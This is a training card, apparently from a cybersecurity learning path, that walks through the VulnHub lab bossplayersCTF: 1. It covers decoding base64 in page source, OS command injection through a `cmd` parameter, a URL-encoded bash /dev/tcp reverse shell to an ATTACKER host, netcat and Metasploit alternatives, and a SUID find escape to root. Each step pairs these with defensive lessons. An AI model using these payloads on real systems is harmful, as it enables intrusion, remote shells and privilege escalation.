# Machine 6 — bossplayersCTF: 1

> **Position:** 6 of 13 · **Band 3 — Easy** (global rank **016** of 708)
> **Full writeup:** [`labs/3-016-bossplayersctf-1/README.md`](../../labs/3-016-bossplayersctf-1/README.md)

| | |
| --- | --- |
| **Machine** | bossplayersCTF: 1 |
| **Author** | Cuong Nguyen |
| **Released** | September 2019 |
| **Target OS** | Debian 10 — Apache 2.4.38 + PHP, OpenSSH 7.9p1 |
| **VulnHub** | [entry/bossplayersctf-1,375](https://vulnhub.com/entry/bossplayersctf-1,375/) |
| **Objective** | get root, then read `/root/root.txt` |
| **Estimated time** | 3–4 hours |

> **Lab tip:** run the VM in **VirtualBox** ("works better with VirtualBox than VMware" —
> VulnHub). Conflicts with the table above are logged as **⚠️ Verification notes** in Part G.

---

## How to use this card

Same template: **A** (method + theory) · **B** (the machine) · **C** (every command, logically). The new theory: **OS command injection** at the source-code level, **URL-encoding of payloads**, **encoding nesting**, **decoy vs real lead**, **reverse shells + TTYs** (A.5), **SUID/`euid`/`-p`** (A.6).

---

# Part A — The method (theory)

## A.1 The new skill: **OS command injection**

It is the most common web-to-shell bug in existence: a GET parameter that runs **whatever you
put in it**. No filters, no tricks — you see the bug, understand the bug, exploit the bug.

**At the source-code level**, vulnerable PHP comes in two shapes:

```php
system($_GET['cmd']);                 // shape 1: the input IS the command
system("ping " . $_GET['cmd']);       // shape 2: the input is glued into a command
```

**Shape 1** is the worst case: your text runs verbatim. **Shape 2** *concatenates* input into a
shell command with no validation — a **metacharacter** after `ping ` runs a **second** command:

| Metacharacter | What it does |
| --- | --- |
| `;` | run the next command afterwards |
| `&&` | run the next **if** the first succeeded |
| `\|` | pipe the first's output into the second |
| `$(...)` / backticks | substitute with a command's output |

**How you probe:** one request, one harmless command (`?cmd=id`) — then ask *whose output is
this?* A normal page returns HTML; a vulnerable one returns **OS output**: `uid=…`, a listing.

> **The single biggest lesson:** *if user input reaches a shell, you have already lost.* Never
> build a shell command from user input — validate (`filter_var($ip, FILTER_VALIDATE_IP)`) and use a safe API.

## A.2 Why payloads in a URL need **URL-encoding**

A browser splits a query string *before* the server sees it: `&` **separates parameters**, `>`
is reserved. `bash -i >& /dev/tcp/…` sent **raw** is **truncated at the first `&`** — the shell
never completes. `%26` = `&`, `%3E` = `>`, `%20` = space: **generate** the encoding, never type it.

## A.3 Encoding nesting — the discipline

A base64 string that decodes to **another** base64. The discipline: **decode → look at the
result → ask whether it is itself encoded → repeat.** Multiple layers usually mean *"someone
thought obfuscation is security"* — our gain. Base64: alphabet `A–Z a–z 0–9 + /`, `=` padding.

## A.4 Decoy vs a real lead

A **decoy** sends you nowhere: **decoding it produces nothing actionable** — no path, no
credential, no existing file; a real lead always resolves into something you can request or log
in with. Note it as a leak and move on; the homepage even reprints the **rabbit-hole** warning.

## A.5 Reverse shells and the TTY (theory for Steps 5–6)

Output inside an HTTP response is **not a shell** — the request ends, the session dies. A
**reverse shell** flips it: the victim connects **out** to a **listener** you control, and that
TCP link carries the shell — so **the listener must exist first** and **every special character
must be URL-encoded** (A.2). Once inside: a **dumb pipe**, no TTY — `sudo` won't prompt, arrows
print `^[[A`, `Ctrl+C` kills your listener. Step 6 fixes that.

## A.6 SUID, `euid` and the `-p` flag (theory for Step 7)

Every process carries two identities: **who you are** (`uid`) and **what you may actually do**
(`euid` — the *effective* user deciding file access). The **SUID bit** makes an executable run
with its **owner's** privileges whoever starts it — that is how `passwd` edits `/etc/shadow`,
shown by `ls -l` as the **`s`** in the owner's execute slot: `-rwsr-xr-x`.

- **A misplaced SUID binary is a root shell.** `find` is world-searchable and, thanks to that
  bit, runs as `root` — a documented abuse: [GTFOBins — find](https://gtfobins.github.io/gtfobins/find/).
- **Shells are paranoid.** `sh`/`bash` **drop** SUID at startup; `-p` means "privileged — do not
  drop". Without it `id` shows `uid=33` with **no `euid=0`**, and you wrongly conclude you failed.

Read `id` as three facts: `uid=` who you are · `euid=` **what you can do** · `groups=` the rest.

---

# Part B — The machine

## B.1 What you will learn

1. Read **page source** for hidden content and decode a **multi-layer base64** chain.
2. Recognise and **refuse to chase a decoy** — and say *why* it is a decoy.
3. What **OS command injection** is at the source-code level, and how to probe for it safely.
4. Test with `curl` and one-line commands before firing any payload.
5. **URL-encode a payload** so it survives a query string — and generate the encoding.
6. Convert command execution into a **reverse shell**, then **upgrade the TTY**.
7. Escalate via **SUID `find`** with `-exec`, `-quit` and `-p` — and read `uid` vs `euid`.
8. Notice that a *flag* can be **encoded** rather than protected.

## B.2 The map

| Stage | Where |
| --- | --- |
| Source disclosure | three-layer base64 → hidden page **`workinginprogress.php`** |
| **Decoy** | `robots.txt` → "lol try harder bro" |
| **Command injection** | `workinginprogress.php?cmd=` → RCE as `www-data` |
| Reverse shell + TTY | `bash -i >& /dev/tcp/…`, then `pty.spawn` |
| **SUID escape** | `/usr/bin/find` → `find . -exec /bin/sh -p \; -quit` |
| Encoded, not protected | `/root/root.txt` = base64 of "congratulations" |

## B.3 Before you start

- [02 — Web Attacks](../02-Web-Attacks.md) **§5** (command injection).
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) §1 (encoding).
- [06 — Shells, Persistence and Escapes](../06-Shells-Persistence-and-Escapes.md) **§1–§2**.
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§2** (SUID).

**Answer before:**
1. Which characters cause a shell to run a **second** command, and which three would you try first?
2. Why must a payload in a URL query string be **URL-encoded**?
3. A base64 string decodes to another base64 string. What is your process?
4. What does `-p` add to `/bin/sh` when the binary is SUID?
5. How do you tell a decoy from a real lead, **without** reading the writeup?

---

# Part C — The walkthrough, step by step

## Step 1 — Find the target, then scan it

**Why now.** First the VM's DHCP address, then its attack surface.

```bash
nmap -sn 192.168.56.0/24                # host discovery — or `netdiscover`, as two writeups did
mkdir -p scans                           # nmap will not create the directory for you
sudo nmap -sC -sV -p- -T4 -oA scans/boss TARGET
```

**The flags.** `-sC` default safe scripts · `-sV` version detection ("http" → "Apache httpd
2.4.38") · `-p-` all 65535 ports, not just the top 1000 · `-T4` faster timing (fine in a local lab) · `-oA` saves normal, grep-able and XML results in one go for the report.

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: bossplayersCTF
```

**How to read it.** Two services, a modern Debian — the entry point is in the **content**, not a
service version: SSH without credentials is a brick wall, `|_http-title:` confirms the intended
site (all four writeups report the same two ports). Stop reading nmap; read HTML.

**Defensive lesson.** Version banners are free reconnaissance — publish only what you must.

## Step 2 — Page source and the base64 chain

**Why.** A browser **hides** HTML comments; `curl` gives you the raw bytes.

```bash
curl -s http://TARGET/ | grep -iE '<!--|base64|=='
```

**The flags.** `curl -s` silent · `grep -i` case-insensitive · `-E` extended regex — hunting
`<!--` (a comment), the word `base64`, and `==` (its padding, a common tell).

```text
<!-- WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK -->
<!-- ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K -->
<!-- d29ya2luZ2lucHJvZ3Jlc3MucGhwCg== -->
```

**How to read it.** Three base64 blobs — peel them one at a time:

```bash
printf '%s' 'WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK' | base64 -d; echo
printf '%s' 'ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K' | base64 -d; echo
printf '%s' 'd29ya2luZ2lucHJvZ3Jlc3MucGhwCg==' | base64 -d; echo
```

```text
ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K
d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==
workinginprogress.php
```

**How to read it.** **Each decode produced another base64 — except the last** (A.3); the final
value is a **filename**. `printf '%s'` writes exactly those bytes where `echo "…" | base64 -d`
(some writeups) would prepend a newline. **Trap:** decode one layer, *look*, then decide — never
chain two `base64 -d` blind, or you miss the layer that stopped being base64.

**Defensive lesson.** Anything in HTML — comments included — is public; obfuscation buys nothing.

## Step 3 — The decoy, and how to know it is one

```bash
curl -s http://TARGET/robots.txt
printf '%s' 'bG9sIHRyeSBoYXJkZXIgYnJvCg==' | base64 -d; echo
```

```text
User-agent: *
Disallow: /supersecretpassword.txt
# bG9sIHRyeSBoYXJkZXIgYnJvCg==
lol try harder bro
```

**How to read it.** `robots.txt` is a crawler convention and **public by design** — anything
listed is *published*. Here the listed file and the base64 comment mock you, and **decoding
produces nothing actionable** (A.4): no path, no credential, no existing file. Two minutes, a
note in the report, move on. **Trap:** "super secret password" is bait *because* it looks like a
lead. **Alternative route:** two writeups brute-forced first (`dirb`/`dirbuster`) and found the
same `robots.txt` plus `/logs.php` (only the PHP version in its source — **no new lead**).

**Defensive lesson.** `robots.txt` is not a security control — never list a path there expecting secrecy.

## Step 4 — The injection point

```bash
curl -s "http://TARGET/workinginprogress.php"                        # the page itself
curl -s "http://TARGET/workinginprogress.php?cmd=id"                 # the probe
curl -s "http://TARGET/workinginprogress.php?cmd=whoami"
curl -s "http://TARGET/workinginprogress.php?cmd=uname -a"
curl -s "http://TARGET/workinginprogress.php?cmd=ls -la /home"
curl -s "http://TARGET/workinginprogress.php?cmd=cat /etc/passwd"
```

```text
<h1>working in progress... come back later</h1>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**How to read it.** The page is a work-in-progress checklist — Shendayan quotes its lines
**"Ping Command has not been tested"** and **"Privilege Escalation has not been fixed"**: the
author points at both bugs himself. `cmd=id` returns **OS output instead of page content**, so
the server runs your input as a whole command — `system($_GET['cmd'])`-style (shape 1, A.1):
writeups sent whole `nc -e …` / `bash -c …` payloads through this parameter and got shells, and
a raw `?cmd=id` returns *only* `id`'s output — a `"ping " . $input` wrapper would have polluted
both with ping errors. The page's "ping" wording is the intended use, not a prefix.
`uid=33(www-data)` = Apache's worker account: unprivileged, nothing yet.

**Why each probe.** One request, one fact: `whoami` = your account; `uname -a` = kernel/arch,
the input for a privesc search; `ls -la /home` = human users (HackNos found `/home/cuong` right
here); `cat /etc/passwd` (HackNos' proof) = every account — world-readable by design, so its
value is **usernames, never passwords** (`/etc/shadow` holds those). **Trap:** how did anyone
know the parameter is `cmd`? Shendayan guessed it in Burp Repeater until `cmd` answered.

**Defensive lesson.** A page that runs OS commands must not be reachable unauthenticated — or must not exist at all (Part D).

## Step 5 — Reverse shell, URL-encoded

```bash
nc -lvnp 4444                                                  # on ATTACKER, FIRST
curl "http://TARGET/workinginprogress.php?cmd=bash -c 'bash -i >%26 /dev/tcp/ATTACKER/4444 0>%261'"
```

**The flags.** `nc -l` listen · `-v` verbose · `-n` no DNS · `-p 4444` port. `bash -i` =
interactive shell; `/dev/tcp/…` is bash's built-in TCP redirection; `0>&1` wires stdin onto the
same socket as stdout/stderr — one bidirectional pipe.

```text
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.101:52114.
www-data@boss:/var/www/html$
```

**How to read it.** "Listening on 0.0.0.0" = every interface. "Connection **from** …" is the
reverse direction in action — the *victim* dialled home. The last line is your new prompt:
`www-data` @ `boss` in `/var/www/html`. You are in.

**The encoding is the part people get wrong** (A.2): without `%26`, the server gets
`cmd=bash -c 'bash -i >` and the shell never completes. Generate it:

```bash
python3 -c "import urllib.parse as u; print(u.quote(\"bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\"))"
```

**Trap.** **Start the listener first** — a one-shot payload that connects to nothing is spent,
and re-triggering later looks like nothing happens. **Alternative routes:** Hacking Articles used
`nc -e /bin/bash ATTACKER PORT`; HackNos pasted Metasploit `exploit/multi/script/web_delivery`
(PHP meterpreter) output into `?cmd=` — every route obeys the same two rules: listener first, encode everything special.

**Defensive lesson.** A web server opening an outbound connection to an attacker IP:port is a loud alarm — with egress filtered, this step cannot happen.

## Step 6 — Upgrade the TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z  ->  back at your Kali prompt
stty raw -echo; fg
reset
```

**Line by line (theory in A.5):** `pty.spawn('/bin/bash')` gives the remote shell a **pseudo-
terminal** — now `sudo` prompts, `vi` works, arrows behave. `export TERM=xterm` says **what kind
of terminal** it is, so the later `reset` has something to re-render. **`Ctrl+Z`** *suspends* the
remote job — both shells share one keyboard, so you must briefly detach to fix **your** side.
`stty raw -echo` passes keystrokes untouched and stops double echo; `fg` resumes the shell; `reset` repaints the screen (run it alone if the display is scrambled).

**Trap.** `fg` before `stty` and you lose the prompt; skip `TERM` and `reset` renders nothing.

**Defensive lesson.** The compromise already happened at Step 4 — but dwell time grows here;
every minute poking around is a minute for logging and EDR to notice `www-data` spawning pseudo-terminals.

## Step 7 — SUID hunt and escape

```bash
find / -perm -u=s -type f 2>/dev/null
ls -l /usr/bin/find
```

**The arguments.** `/` = start at the filesystem root (slow but complete) · `-perm -u=s` = owner has the set-user-ID bit (symbolic twin of `-perm -4000`) · `-type f` = files only · `2>/dev/null` = send stderr (fd 2) away, so "Permission denied" noise stays out of results.

```text
/usr/bin/su
/usr/bin/passwd
/usr/bin/find        <-- !!
-rwsr-xr-x 1 root root 40288 Jan 10  2019 /usr/bin/find
```

**How to read it.** `su` and `passwd` are **stock** SUID binaries — that is their job. `find` is
not: a normal Debian never ships it SUID. In `-rwsr-xr-x`, the **`s`** in the owner's execute
slot (A.6) means it runs as its owner — `root`.

```bash
find . -exec /bin/sh -p \; -quit
id
```

**The arguments.** `.` = start **here** (the web root is full of files, so the first match is
immediate) · `-exec CMD \;` runs CMD **per match**, the `\;` stops *your* shell eating the
semicolon · `-quit` exits after the first match — without it you spawn a root shell **per file**.

```text
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=33(www-data)
```

**How to read it.** `uid=33` is unchanged — you did not *become* root; you run a **root-owned
privileged process**. The deciding field is **`euid=0(root)`**: that is what reads `/root`.
**`-p` is why it is there** (A.6): without it, `id` shows plain `uid=33` with no `euid=0` —
HackNos used the same escape (`/bin/bash -p`); GTFOBins documents both. **Trap:** `-exec` fires
**per match** — in an empty directory you get nothing, no error; and `uid=33` with no `euid=0` means a missing `-p`.

**Defensive lesson.** The stock SUID set is small and auditable — `chmod u-s` the stray, diff against the package database, alert on **any** addition.

## Step 8 — The flag, which is itself encoded

```bash
cat /root/root.txt
cat /root/root.txt | base64 -d
```

```text
Y29uZ3JhdHVsYXRpb25zCg==
congratulations          (after base64 -d)
```

**How to read it.** With `euid=0`, `/root` is readable — the whole point of Step 7 (Hacking
Articles and HackNos both did `cd /root; ls; cat root.txt`). The content is **base64, not
encryption**: no key, anyone reverses it — **obfuscated, not protected**, exactly like the page
source in Step 2: the box's closing lesson. **Trap:** your un-upgraded shell may echo commands
back strangely (Hacking Articles calls this out) — the missing TTY from Step 6, not a broken flag.

**Defensive lesson.** A secret must be protected by access control, not by looking unreadable.

---

# Part D — Defensive lessons

| Finding | Fix |
| --- | --- |
| **`system("ping " . $_GET['cmd'])`** | Never pass user input to a shell. Validate as an IP + a safe API; better, do not shell out at all |
| base64 chain in page source | Anything in HTML is public. Obfuscation buys nothing — protect with authentication and access control |
| `robots.txt` treated as hiding something | Public by design; never list a path there expecting secrecy |
| No authentication on `workinginprogress.php` | A page that runs OS commands must not be reachable unauthenticated — or must not exist |
| SUID on `/usr/bin/find` | `chmod u-s`; audit SUID against the stock set; alert on any addition |
| Outbound connections allowed from the web server | Egress-filter the DMZ; a reverse shell should not be able to reach the internet |
| No WAF / no logging on the parameter | Log and alert on shell metacharacters in query strings |

**The single biggest lesson:** *if user input reaches a shell, you have already lost.*

---

# Part E — Review questions

1. Write the vulnerable PHP line you think this page contains. Then write the **fixed** version, using a validation function rather than escaping.
2. Why did the payload need `%26` instead of `&`? What would have happened otherwise?
3. You had three base64 layers. Where else do layered encodings show up?
4. How did you **know** `robots.txt` was a decoy? Honestly, could you have told before decoding it?
5. Why is `-p` necessary on `/bin/sh` here? What happens without it?
6. `id` showed `uid=33` but `euid=0`. Which one decides what you can read?
7. The root flag was base64-encoded. Does that make it more secure? What is the difference between **obfuscating** a secret and **protecting** one?

---

# Part F — Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

The homepage looks almost empty. It is not. Look at the **HTML source** — `curl -s http://TARGET/ | less`. There is an encoded blob; it may need decoding **more than once**. Do not spend 20 minutes on `robots.txt`.
</details>

<details>
<summary><strong>Rung 2 — what the blob says</strong></summary>

Three base64 layers → **`workinginprogress.php`**. `robots.txt` → "lol try harder bro" → a decoy.
The page's own checklist ("ping not tested", "privilege escalation not fixed") is the author pointing at both bugs.
</details>

<details>
<summary><strong>Rung 3 — the injection</strong></summary>

`curl "http://TARGET/workinginprogress.php?cmd=id"` → `www-data`. The server executes the parameter as a command (`system($_GET['cmd'])`-style). Confirm, then enumerate: `whoami`, `uname -a`, `ls -la /home`.
</details>

<details>
<summary><strong>Rung 4 — shell and escalation</strong></summary>

Listener **first**: `nc -lvnp 4444`. Then a URL-encoded payload (`&`→`%26`) — generate it with `urllib.parse.quote`. Upgrade the TTY. Then `find / -perm -u=s -type f 2>/dev/null` → **`/usr/bin/find`** → `find . -exec /bin/sh -p \; -quit` (run it where files exist).
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap` → **22, 80**. 2. Page source → three-layer base64 → **`workinginprogress.php`**. 3. `robots.txt` = a decoy. 4. **Command injection** `?cmd=` → `www-data`.
5. URL-encoded reverse shell + TTY. 6. **SUID find** → `euid=0`. 7. `/root/root.txt` → base64 → "congratulations".
</details>

---

# Part G — References

- **VulnHub entry:** <https://vulnhub.com/entry/bossplayersctf-1,375/>
- **English lab:** [`labs/3-016-bossplayersctf-1/README.md`](../../labs/3-016-bossplayersctf-1/README.md)
- **Greek mirror of this card:** [`Μηχανές/06-bossplayersctf-1.md`](../../Μαθησιακή%20Διαδρομή%201%20-%20Εισαγωγή%20στην%20Κυβερνοασφάλεια/Μηχανές/06-bossplayersctf-1.md)
- **Cross-checked writeups** (confirm ports 22/80, base64→`workinginprogress.php`, SUID find): [Hacking Articles](https://www.hackingarticles.in/bossplayersctf-1-vulnhub-walkthrough/) · [HackNos](https://www.hacknos.com/bossplayersctf-1-walkthrough-vulnhub/) · [Shendayan](https://shendayan.github.io/CTF-Writeups/BossplayersCTF/EN.html) · [GTFOBins — find](https://gtfobins.github.io/gtfobins/find/)

- **Community notes — consensus, pitfalls and alternative routes** (cross-checked against the sources below):
  - **Consensus chain:** nmap (`22/80`) → page-source comment → three-layer base64 → `workinginprogress.php` → OS command injection at `?cmd=` → reverse shell → SUID `/usr/bin/find` → base64-encoded root flag.
  - **Common pitfall:** a raw payload in the query string is truncated at the first `&`; URL-encode it (`&`→`%26`, `>`→`%3E`, space→`%20`) instead of typing it.
  - **Common pitfall:** start the listener **before** firing the one-shot reverse shell, and ignore `robots.txt` — it is a decoy.
  - **Common pitfall:** `find . -exec …` only fires **per match** (an empty directory gives you nothing), `-quit` must come after `\;`, and a missing `-p` silently drops you back to `uid=33` with no `euid=0`.
  - **Alternative route:** the shell need not be the bash `/dev/tcp` one-liner — `nc -e /bin/bash ATTACKER PORT` (Hacking Articles) or Metasploit `exploit/multi/script/web_delivery` (PHP meterpreter, pasted into `?cmd=`, HackNos) work too; for privesc `find . -exec /bin/bash -p \; -quit` is equivalent. Enumeration may also start with a directory brute force (`dirb`/`dirbuster` → `robots.txt` + `/logs.php`, which Shendayan reports shows only the PHP version — no new lead) and with guessing the parameter name in Burp Repeater (Shendayan tried `ping`, `id`, … until `cmd` answered). One writeup mentions weighing hash cracking against the SUID shortcut and taking `find` instead.
  - **⚠️ Verification note — release metadata:** VulnHub's own release record lists **28 Sep 2019** and author **Cuong Nguyen**; the table's "September 2019" is taken directly from it and stands.
  - **⚠️ Verification note — difficulty and time:** Hacking Articles labels the box **"Intermediate"**, while VulnHub's description says it is "aimed at Beginner Security Professionals" and claims "around 30 minutes to root". The card keeps **Band 3 — Easy** and **3–4 hours** — the VulnHub figure assumes an experienced player, not a learner reading the theory first.
  - **⚠️ Verification note — target OS:** Shendayan's raw nmap output (`OpenSSH 7.9p1 Debian 10`, `Apache httpd 2.4.38 ((Debian))`) confirms the table row. Hacking Articles' prose once calls port 80 "Rocket httpd", which its own scan and every other writeup contradict — the table keeps Apache.
  - **⚠️ Verification note — page name:** HackNos types the page as `workingprogress.php` (missing "in") in two places; the base64 itself decodes to `workinginprogress.php` and Hacking Articles/Shendayan use that spelling — the card keeps `workinginprogress.php`.
  - **⚠️ Verification note — vulnerable PHP line:** no live writeup publishes the source of `workinginprogress.php`. Part A.1 therefore shows the **two shapes** this bug takes, and Step 4 infers this box's behaviour from observed outputs (a raw `?cmd=id` returns only `id`'s output; whole `nc`/`bash` payloads execute) — where the card says "something like", it means it.
  - **⚠️ Verification note — flag file:** `cd /root; ls; cat root.txt` → base64 → "congratulations" is confirmed independently by Hacking Articles and HackNos.
  - **⚠️ Verification note — dead sources:** the old Infosec Institute and D00MFist/Medium links were dead when re-checked (the Infosec article still answers **HTTP 403** to automated fetches); the **Verified sources** below are the live replacements used for this rewrite.
  - **Verified sources:** [Hacking Articles](https://www.hackingarticles.in/bossplayersctf-1-vulnhub-walkthrough/) · [HackNos](https://www.hacknos.com/bossplayersctf-1-walkthrough-vulnhub/) · [Shendayan (GitHub Pages)](https://shendayan.github.io/CTF-Writeups/BossplayersCTF/EN.html)

---

# Part H — If you get completely stuck

- Verify connectivity: `ping TARGET`, `ip -br a`.
- **Listener first, then the payload.** And remember `%26`.
- If `find` does not give root, try `/usr/bin/find . -exec /bin/bash -p \; -quit`.
- Check [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and [`docs/TOOLS.md`](../../docs/TOOLS.md).
- Still blind on one step? Open the matching rung in **Part F** — rung 1 is a nudge, rung 5 the full answer map.
- Revert the snapshot and redo from memory.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 5 — Kioptrix: Level 1](05-kioptrix-level-1-1.md) · next: [Machine 7 — Mr-Robot: 1](07-mr-robot-1.md) · full writeup: [`labs/3-016-bossplayersctf-1`](../../labs/3-016-bossplayersctf-1/README.md)._
